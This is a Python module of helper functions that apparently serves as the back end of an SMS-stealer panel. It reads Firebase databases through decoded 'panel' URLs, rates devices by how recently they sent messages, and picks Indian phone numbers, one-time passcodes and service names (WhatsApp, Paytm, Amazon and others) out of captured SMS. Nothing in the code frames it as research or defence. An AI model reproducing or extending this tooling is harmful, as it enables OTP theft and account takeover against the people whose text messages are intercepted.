import aiohttp, json, re, base64, time
from collections import Counter

async def fetch_fb(url, auth=None):
    full_url = url
    if auth: full_url += f"?auth={auth}" if "?" not in full_url else f"&auth={auth}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(full_url, timeout=8) as resp:
                if resp.status == 200:
                    txt = await resp.text()
                    if txt == "null" or not txt: return {}
                    return json.loads(txt)
    except Exception: pass
    return None

async def check_ping(url):
    start = time.time()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{url}/.json?shallow=true", timeout=3) as resp:
                if resp.status == 200:
                    ms = int((time.time() - start) * 1000)
                    return f"{ms}ms"
    except Exception: pass
    return "❌ Timeout"

def decode_panel_url(panel_url):
    match = re.search(r'([A-Za-z0-9+/=]{20,})', panel_url)
    if not match: return None
    b64_str = match.group(1)
    try:
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        decoded = base64.b64decode(b64_str).decode('utf-8')
        if "|||" in decoded: return decoded.split("|||")[0], ""
        try:
            data = json.loads(decoded)
            if isinstance(data, dict) and "url" in data: return data["url"], data.get("key", "")
        except json.JSONDecodeError:
            if decoded.startswith("http"): return decoded, ""
    except Exception: pass
    return None

def calculate_health(msgs):
    if not msgs: return 1 
    latest_time = 0
    for m in msgs:
        m_id = m.get("id", 0)
        if isinstance(m_id, (int, float)) and m_id > 100000000000: 
            if m_id > latest_time: latest_time = m_id / 1000
        elif isinstance(m_id, str) and m_id.isdigit() and len(m_id) > 12:
            if int(m_id)/1000 > latest_time: latest_time = int(m_id)/1000
        m_time = m.get("time", 0)
        if isinstance(m_time, (int, float)) and m_time > 100000000000:
            if m_time/1000 > latest_time: latest_time = m_time/1000
            
    if latest_time == 0: return 5 
    diff_hours = (time.time() - latest_time) / 3600
    if diff_hours < 0.5: return 10
    if diff_hours < 2: return 8
    if diff_hours < 6: return 6
    if diff_hours < 12: return 4
    return 2

def extract_best_numbers(dev_data, msgs):
    all_text = " ".join([m.get("message", "") for m in msgs])
    matches = re.findall(r'(?:\+?91[\-\s]?)?([6-9]\d{9})\b', all_text)
    bad_numbers = {"9264092640", "18001800", "919951860002", "18001035577", "1234567890"}
    matches = [m for m in matches if m not in bad_numbers]
    
    counts = Counter(matches)
    scored_numbers = []
    
    for num, count in counts.items():
        score = min(count * 10, 50) # Base score from frequency (max 50%)
        is_carrier = False
        for m in msgs:
            sender = str(m.get("sender", "")).lower()
            msg_text = m.get("message", "")
            if num in msg_text:
                if any(c in sender for c in ["jio", "airtel", "vi", "bsnl"]):
                    is_carrier = True
                    break
        
        if is_carrier: score = 100 
        else: score = min(score + 20, 99) # Add 20% for normal repeat
        scored_numbers.append((num, score))

    for key in ["phoneNumber", "phone", "number", "mobile"]:
        if dev_data.get(key):
            n = re.sub(r'\D', '', str(dev_data[key]))[-10:]
            if len(n) == 10 and n not in bad_numbers:
                scored_numbers.append((n, 100))

    best_nums = {}
    for n, s in scored_numbers:
        if n not in best_nums or s > best_nums[n]: best_nums[n] = s
        
    return sorted(best_nums.items(), key=lambda x: x[1], reverse=True)[:2]

def extract_otp(text):
    if not any(k in text.lower() for k in ["otp", "code", "verification", "login", "pin", "password"]): return None
    match = re.search(r'\b(\d{4,8})\b', text)
    return match.group(1) if match else None

def extract_service_name(text, sender):
    text_lower = text.lower()
    services = {"whatsapp": "WhatsApp", "facebook": "Facebook", "instagram": "Instagram", "telegram": "Telegram", "amazon": "Amazon", "flipkart": "Flipkart", "swiggy": "Swiggy", "zomato": "Zomato", "paytm": "Paytm", "jio": "Jio", "airtel": "Airtel"}
    for key, name in services.items():
        if key in text_lower: return name
    if sender:
        parts = sender.split("-")
        if len(parts) > 1: return parts[1]
    return "Unknown"
